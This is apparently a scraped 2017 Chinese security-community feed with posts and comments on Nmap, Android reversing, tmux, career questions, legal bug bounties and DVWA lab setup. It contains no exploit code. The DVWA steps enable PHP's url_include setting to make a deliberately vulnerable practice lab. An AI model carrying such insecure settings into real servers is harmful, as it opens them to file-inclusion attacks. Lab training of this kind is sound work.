<img src="https://file.xiaomiquan.com/64/78/6478c53b7ce3530d1a74526571c996d829dc7e030a044113d9dcfc277d356ca1.jpg" width="25px"/> __宫崎没有骏__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 真去哦

<img src="https://file.xiaomiquan.com/c0/c0/c0c08efbac9f7841a0b0e34210cb18f0b6f5e0edcf5dcf3b5e00492c95406fd6.jpg" width="25px"/> __八分熟__: 送给需要得朋友，

<img src="https://file.xiaomiquan.com/e4/65/e465e874c8d9bef8b99fcf786f37aa0ba55202b26b7cf835e5c2e7965b36b621.jpg" width="25px"/> __Evoker__: 我在北京，但是我可能听不懂😂，留给需要的朋友吧😄

<img src="https://file.xiaomiquan.com/0e/b9/0eb9006ecb09aa6818805b723099b5bcea76ac05443084241129b856ac06b389.jpg" width="25px"/> __李凯 KOP Lee💪__: 新安全测试工程师求票😅

<img src="https://file.xiaomiquan.com/8a/ab/8aabbb8db51cf20065c8aeb674187c0a83841b4f137eb36bd504730e4cf6bb76.jpg" width="25px"/> __Gabriel__: 北京的学生求票！！！！

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 小快手表示身为测试工程师，真的想去🙏。当然主攻还是渗透测试😋


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-14:

公告：以后不再发布任何技能树:-) 有些东西被一些垃圾看到亏大了。

但本圈的分享会持续，得对得起支持者们。



...

<img src="https://file.xiaomiquan.com/87/4a/874a9d7bc90aec06621571157ebc051fbde8f37747aa5c2d5a8ebb11163cbe88.jpg" width="25px"/> __风__: 看到公众号的我赶紧来圈子看看，虚惊一场😋

<img src="https://file.xiaomiquan.com/96/31/9631bec9f6f12bea11cb521e5ce81ad19774f038e85bc4e9e94d687189f31b99.jpg" width="25px"/> __派__: 多发红包少发言😁一起努力吧

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 余大大的技能树是我见过最接地气靠谱的汇总资料，没有之一！对了，刚在看之前买的web前端黑客技术揭秘，不经意看了看作者，原来😍

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 这评价我收了，感谢。实战派不废话。那本书你才发现是我写的😤

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 惭愧啊，想着认真专心研究下前段web翻出来，以前没记下来，刚看了作者才感受到要赶快先看这本😄

<img src="https://file.xiaomiquan.com/d2/18/d218f1e1f6265c71a5b8590ca5f47d80f81ca4d5998c8fc968e01ad974e43fb0.jpg" width="25px"/> __trav__: 怎么了？被剽窃了？

<img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: 发生了什么

<img src="https://file.xiaomiquan.com/67/6d/676dce5cc274939c3aff999a5a33001505c937dcf2325728952b4e67f9efb3e6.jpg" width="25px"/> __KevinShan__: 不知道发生了什么，感觉可以继续在密圈里完善分享，估计他们不会为知识付费

<img src="https://file.xiaomiquan.com/cd/f6/cdf616f3c3482ab88d82a504400e8de7f0beb76954a7ccdf4b2240ade40df4a8.jpg" width="25px"/> __Daxer__: 发生了什么😤

<img src="https://file.xiaomiquan.com/c6/41/c641b7802e897b7db7ba7478828a71417a8ff50b0a11c0747987e281cdfe85d6.jpg" width="25px"/> __LP__: 刚加入就看到了这个，心都碎了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c6/41/c641b7802e897b7db7ba7478828a71417a8ff50b0a11c0747987e281cdfe85d6.jpg" width="25px"/> __LP__: 本圈持续发展，没事

<img src="https://file.xiaomiquan.com/15/73/1573e3d1dbeb1675b2c1f5cb471cbf81849258d6513431bd4bccbb3b2d718b1d.jpg" width="25px"/> __s1eep__: 在微信看到公告  以为弦哥要跑路😁 赶紧来看看

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 不在发布技能树了吗💔

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 今天关注了cos的微博才知道有无耻的人滥用咱的技能树

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 嗯 非常的


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-14:


__#工具#__

  Nmap 7.50 正式发布：


[Download the Free Nmap Security Scanner for Linux/...](https://nmap.org/download.html)

 

新增 14 个 NSE 脚本，300 多个指纹规则。

Nmap 是玩安全的人必备的工具，无论攻防都必备，基于 Nmap 写插件（NSE 脚本）很容易，只需掌握 lua 脚本语言即可。

有同学问扫描器问题，其实能玩精 Nmap，这就是一款非常强大的扫描器，包括漏洞扫描！



...

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: nmap是不是不支持异步，英文是硬伤啊😖

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 你是怎么理解异步的

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我理解的是它在扫描时发包后必须等到收包，只能通过设置较小的超时来缩短扫描时间。异步就是只管发包，不维护状态，收包另外一个线程负责。好像有个ma开头的软件就是这样的，比如要扫整个互联网的话速度会快些。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 不过只适用于端口扫描和存活扫描

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 最近用nmap搞内部分析，排除端口等信息收集很棒，感觉带脚本扫描并不比xscan之类有优势，比如带brute，时间上和结果上都不理想，不知道是不是用的不好。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 嗯 确实

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 他们有些插件其他也写得不好

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 正好扫扫我的VPS

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 
[NMAP 基础教程 | WooYun知识库](http://cb.drops.wiki/drops/tips-2002.html)


这里有篇nmap入门的文章，没接触过nmap的同学可以看下，
乌云知识库还有很多其他的好教程可以搜索 :)

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 感谢互动

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😁，希望大家也能多互动多分享。

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 有没有一些nmap的高级利用姿势的文章分享，或者nmap的漏洞扫描，脚本利用这一块儿的详细资料？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 记得之前看到，回头我找找

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好的😄

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 另外我也来说一下，在对外网一些目标做端口扫描的时候，目标如果有array等负载均衡设备(我猜测的),可能导致每个端口都会显示开放状态总之就是没法探测到到底真实开了什么端口，这个时候就用amap吧，不会有误报，可能nmap也有相关参数可以做到这种效果，但是我不知道。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-14:


__#资源#__

  Android 应用逆向入门

圈子有不少同学有问安卓安全/调试/逆向方面的知识，这里推荐这篇：


[https://www.evilsocket.net/2017/04/27/Android-Appl...](https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/)



这篇文章很不错，可以学到：

apk 基本知识，adb 基本命令，网络分析（用到了作者自己开发的 bettercap），静态分析，动态分析，动态注入等入门知识。

除了文中这些，我还有用到的如：Inspeckage、MobFS。

实战出真知。

<img src="https://images.xiaomiquan.com/FnpxBcd8M5Z8YfmmTHV_tusHlkbn?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lz2IwMYoeus_E09sqOHOl57X0Ys=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:


__#姿势#__

 Linux 多终端神器 tmux

只要遇到谁在皱着眉头玩 Linux，我肯定就会问：“怎么没在 tmux 下操作？哪怕 screen 也行呀，你这样跑任务，万一网络断了，终端退出，任务不就死了？”

这句话往往会让不少人一头雾水，什么是 tmux？什么是 screen？这里不说 screen，说这个更强大的 tmux，玩会这个，你将拥有 Linux 下多终端快速操作技能，再也不用担心网络断了，导致当前任务死掉。

如果你在 Ubuntu 下，可以这样安装：

apt-get install tmux

想快速入门可以看这篇文章：


[http://blog.jobbole.com/87278/](http://blog.jobbole.com/87278/)



对了，这个命令在安全技能树里有列出，你发现了没？

<img src="https://images.xiaomiquan.com/FoF9HHeR_gXthlqlZLsj_QQxUSQ5?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:1-aYUGO5-lAGg43kIO2ZSoHin-Q=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: screen -S sqlmap
ctrl+A D睡觉去……
第二天：
screen -r sqlmap

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 试试 tmux，刚开始你会不习惯，习惯后可以扔掉 screen 了

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: iterm2 好用

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__: 在用，以前总是开一堆终端，一个写脚本一个测试脚本，遇上两个脚本的时候简直是地狱，自从用了tmux世界都光明了

<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 有机会试下，目前小跑安全路当中。

<img src="https://file.xiaomiquan.com/06/80/0680db16c9c7b01e0339fde36284b22a6883bda247cdabb58ed9c92235fa2f3c.jpg" width="25px"/> __英雄马__: iterm2 好用

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/06/80/0680db16c9c7b01e0339fde36284b22a6883bda247cdabb58ed9c92235fa2f3c.jpg" width="25px"/> __英雄马__: 不是一个感觉

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 不是一个感觉

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有空去感觉下

<img src="https://file.xiaomiquan.com/8f/79/8f79b2f9cc50f9c3cc4599fa4a3c2881fe5d4b680ae03889196bcb10ca21b285.jpg" width="25px"/> __吴文尉__: 踩过坑的我也来说一句，tmux和spf1配合用，会有一个背景色冲突的问题，一直没有找到解决方法，知道上次看到官方文档，需要加一个参数 -2

<img src="https://file.xiaomiquan.com/8f/79/8f79b2f9cc50f9c3cc4599fa4a3c2881fe5d4b680ae03889196bcb10ca21b285.jpg" width="25px"/> __吴文尉__: tmux和spf13结合，vim会出现背景色冲突的问题，解决方法就是加一个参数 －2，即可

<img src="https://file.xiaomiquan.com/d7/28/d7289088de0995b81a7ecd6139812dc6d6b566d02c617a019a4f69b80438a435.jpg" width="25px"/> __掌柜的__: 最喜欢ctrl+b "  %无论如何分成4个再说，另外同一个session做操作分享真的太好用了，通常搞不定的bug让基友远程调测，用tmux我就可以同步看，非常方便。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/d7/28/d7289088de0995b81a7ecd6139812dc6d6b566d02c617a019a4f69b80438a435.jpg" width="25px"/> __掌柜的__: 嗯 是的

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 突然发觉这篇文章校稿的是我朋友😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 巧呀


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 匿名用户 提问：
请问，现在的安全公司，应用机器学习的多吗，机器学习在安全领域有哪些方面的应用？


其实算多，现在机器学习一般用于防御、流量分析、日志分析、威胁分析这方面。一般数据大了或样本多了后都会上机器学习相关算法。



...

<img src="https://file.xiaomiquan.com/d5/e2/d5e2c743b11219566a3a0be9afee30fcded7afcf91b1aebe6d29e87855ae6239.jpg" width="25px"/> __hecRan__: 这方面有具体点的案例和讲解么。

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 我觉得扫描器是不是应该也可以加进去，机器学习生成payload之类


...

---

<img src="https://file.xiaomiquan.com/f2/18/f2187aaef0629494fb3ab1ab45faea17ed9021d9408eb286db2694c418ae7acf.jpg" width="25px"/> __ENI__ on 2017-06-12:

> axindeng 提问：
作为一个团队leader,如何管理好本团队的文档，同时不会被泄露的风险呢？


难，根本还是在于团队里不要出现人品恶劣的人，如果是因为被黑而泄露，另当别论。

建议是：做好意识与责任强调，如果泄露需要担负什么什么责任。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 匿名用户 提问：
现在是一名马上升大二的软件专业学生，在接受cisco CCIE(路由交换)的培训，请问cos大大cisco网络这方面的知识对于做安全有什么帮助吗?(｡•́︿•̀｡)


有，但是这会是非常基础的培训，可能一时半会感受不到安全的刺激。



...

<img src="https://file.xiaomiquan.com/6e/ba/6eba59357eced202d0206a737f71e28b83896b315432fd3a2014be0d3c2658ae.jpg" width="25px"/> __不随便__: 我本身是思科培训讲师，没感觉到刺激😓

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/6e/ba/6eba59357eced202d0206a737f71e28b83896b315432fd3a2014be0d3c2658ae.jpg" width="25px"/> __不随便__: 😆


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 北风飘然 提问：
弦大 最近打算写个被动扫描的东西  大概是 浏览器=>python代理   然后做异步请求  不知道有什么推荐的第三方库做代理么


有，mitmproxy 很不错。



...

<img src="https://file.xiaomiquan.com/b6/4a/b64a313d21a50c71fa67bee596a343fd60aa66d5437d5ee537f28bcb3849b8ca.jpg" width="25px"/> __北风飘然__: 谢谢弦大  刚也看到这个了  我去啃一遍文档~~


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 匿名用户 提问：
Cos哥，网络安全法出来了，不敢搞站了。有什么办法可以实战渗透吗？


如果只是挖漏洞，可以去各大 SRC，还有 HsckerOne；否则不少乙方有安服需求，是授权的，但是一般情况下安服很难玩身真正的渗透。

其他方式不说了。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> Evoker 提问：
弦哥，网易云课堂出的web安全培训有必要报名嘛……能帮我参考一下吗


这个吗？
[Web安全工程师 - 网易云课堂](http://mooc.study.163.com/smartSpec/detail/1001227001.htm)



看去不错呀，其他没法给更多建议。



...

<img src="https://file.xiaomiquan.com/e4/65/e465e874c8d9bef8b99fcf786f37aa0ba55202b26b7cf835e5c2e7965b36b621.jpg" width="25px"/> __Evoker__: 对，就是这个😂。好吧...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e4/65/e465e874c8d9bef8b99fcf786f37aa0ba55202b26b7cf835e5c2e7965b36b621.jpg" width="25px"/> __Evoker__: 7个有实战经验的人做出的课程，我感觉靠谱度会高不少，这种宣传也让人放心。这是我的补充建议。

<img src="https://file.xiaomiquan.com/e4/65/e465e874c8d9bef8b99fcf786f37aa0ba55202b26b7cf835e5c2e7965b36b621.jpg" width="25px"/> __Evoker__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好的，谢谢弦哥，已报名😝

<img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 期待余大大线上培训

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: 😬

<img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__: 很基础的培训，适合没基础新人

<img src="https://file.xiaomiquan.com/d5/51/d5511dca91efbec5379a3a46988d102192a8fc0d4fd274c7a9a1e895e244eaf5.jpg" width="25px"/> __木木__ replies to <img src="https://file.xiaomiquan.com/e4/65/e465e874c8d9bef8b99fcf786f37aa0ba55202b26b7cf835e5c2e7965b36b621.jpg" width="25px"/> __Evoker__: 大兄弟拼团吗😉


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 匿名用户 提问：
弦哥，如何在github上发现好的可以参与进去的开源项目🤔🤔


没看我发的安全技能树么？里面那么多开源项目，你感兴趣就去提交修改，慢慢就能参与进去。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 。东 提问：
大二即将升大三的大学狗的提问。
我想未来走web安全这条路，但是目前有两个选择，其一是大四找家公司实习，另外一个是考研，我们这边985 211的大学有开设网络安全学院，请问cos，对于我这种情况有什么看法建议，或者指点吗？


如果厉害，两者可以兼备。否则非得选一条，我也不知道。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:

> 。东 提问：
大二即将升大三的大学狗的提问。
我想未来走web安全这条路，但是目前有两个选择，其一是大四找家公司实习，另外一个是考研，我们这边985 211的大学有开设网络安全学院，请问cos，对于我这种情况有什么看法建议，或者指点吗？


如果厉害，两者可以兼备。否则非得选一条，我也不知道。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:


__#姿势#__

  DVWA 漏洞测试环境的搭建过程

DVWA 有在我们的安全技能树里提到，以下是 Win10 下的搭建过程，来自@丹青  同学的分享，踏了一些坑，都解决了，感兴趣的同学可以参考。

如果你也有什么经验可以分享到圈子内的可以私信我交流。

----------

1.下载xampp,dvwa

2.解压dvwa-master,把解压后的文件夹名字改为dvwa

3.删除xampp文件夹里htdocs文件夹里的所有文件，然后把dvwa文件夹拷到htdocs文件夹里。

4.把dvwa文件夹里的config文件的扩展名(.dist)去掉，编辑config文件的内容，把p@ssw0rd去掉

5.用管理员权限打开xampp，点击start Apache,Mysql

6.在浏览器端输入
[http://localhost/dvwa/setup.php](http://localhost/dvwa/setup.php)



7.点击creat database，然后出现登录界面，用户名是admin,密码是password

8.配置xampp控制台上的Apache,点击config中的PHP(php.ini),查找url_include,把它后面的Off改为On.

9.restart apache

10.成功！！！

ps:xampp的下载地址:
[XAMPP Installers and Downloads for Apache Friends](https://www.apachefriends.org/zh_cn/index.html)



dvwa的下载地址:
[DVWA - Damn Vulnerable Web Application](http://www.dvwa.co.uk/)



视频教程地址:
[https://www.youtube.com/watch?v=cak2lQvBRAo&index=...](https://www.youtube.com/watch?v=cak2lQvBRAo&index=1&list=LLZ6KzzklgOHCRwQj8hNX89Q)





...

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 可以直接搭个metasploitable2啊，自带很多这种环境

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 不是一样的东西，也不影响这个分享

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 也可以，不过搭建过程好像对小白不是很友好😅

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 那个下载下来就是个虚拟机啊，打开直接用，根本不用搭建吧。。。

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 啊？不用配合其他虚拟平台吗？我刚刚去搜了一下这个东西，有一篇教程是在virtual box host 安装metasploitable2。。

